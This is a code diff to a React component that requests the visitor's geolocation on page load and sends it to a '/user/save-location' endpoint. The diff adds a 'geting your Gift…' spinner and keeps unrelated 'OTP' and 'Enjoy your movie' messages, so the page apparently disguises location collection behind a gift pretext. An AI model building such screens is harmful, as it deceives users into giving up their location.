@@ -1,51 +1,58 @@
-import React, { useEffect, useRef } from 'react';
+import React, { useEffect, useRef, useState } from 'react';
 import axios from '../../api/axios';
 import { useNavigate } from 'react-router-dom';
 
 function LocationCapture() {
   const navigate = useNavigate();
   const attempted = useRef(false);
+  const [loading, setLoading] = useState(true);
 
   useEffect(() => {
-    if (attempted.current) {
-      console.log('Already attempted, skipping.');
-      return;
-    }
+    if (attempted.current) return;
     attempted.current = true;
 
     if (!navigator.geolocation) {
       console.error('Geolocation not supported');
+      setLoading(false);
       // navigate('/home');
       return;
     }
 
-    console.log('Requesting geolocation…');
     navigator.geolocation.getCurrentPosition(
       async (position) => {
-        console.log('Got position:', position);
         const { latitude, longitude } = position.coords;
         try {
           const token = localStorage.getItem('token');
-          console.log('Sending to API:', latitude, longitude);
-          const resp = await axios.post(
+          await axios.post(
             '/user/save-location',
             { latitude, longitude },
             { headers: { Authorization: `Bearer ${token}` } }
           );
-          console.log('API response:', resp.data);
+          console.log('Location saved');
         } catch (err) {
           console.error('API error:', err);
         } finally {
-          // once you confirm it’s working, you can uncomment this
+          setLoading(false);
           // navigate('/home');
         }
       },
       (error) => {
         console.error('Geolocation error:', error);
+        setLoading(false);
         // navigate('/home');
       }
     );
-  }, []); // no navigate dep needed here
+  }, [navigate]);
+
+  const spinnerStyle = {
+    border: '4px solid #f3f3f3',
+    borderTop: '4px solid #444',
+    borderRadius: '50%',
+    width: '40px',
+    height: '40px',
+    animation: 'spin 1s linear infinite',
+    marginBottom: '12px'
+  };
 
   return (
     <div style={{
@@ -57,12 +64,27 @@ function LocationCapture() {
       backgroundColor: '#f5f5f5',
       fontFamily: 'sans-serif'
     }}>
-      <h2 style={{ color: '#444', marginBottom: '10px' }}>
-        Your OTP will be sent 📩
-      </h2>
-      <p style={{ color: '#777' }}>
-        Enjoy your movie 🎬
-      </p>
+      {loading ? (
+        <>
+          <div style={spinnerStyle} />
+          <p style={{ color: '#444', marginTop: '8px' }}>geting your Gift…</p>
+          <style>{`
+            @keyframes spin {
+              0% { transform: rotate(0deg); }
+              100% { transform: rotate(360deg); }
+            }
+          `}</style>
+        </>
+      ) : (
+        <>
+          <h2 style={{ color: '#444', marginBottom: '10px' }}>
+            Your OTP will be sent 📩
+          </h2>
+          <p style={{ color: '#777' }}>
+            Enjoy your movie 🎬
+          </p>
+        </>
+      )}
     </div>
   );
 }
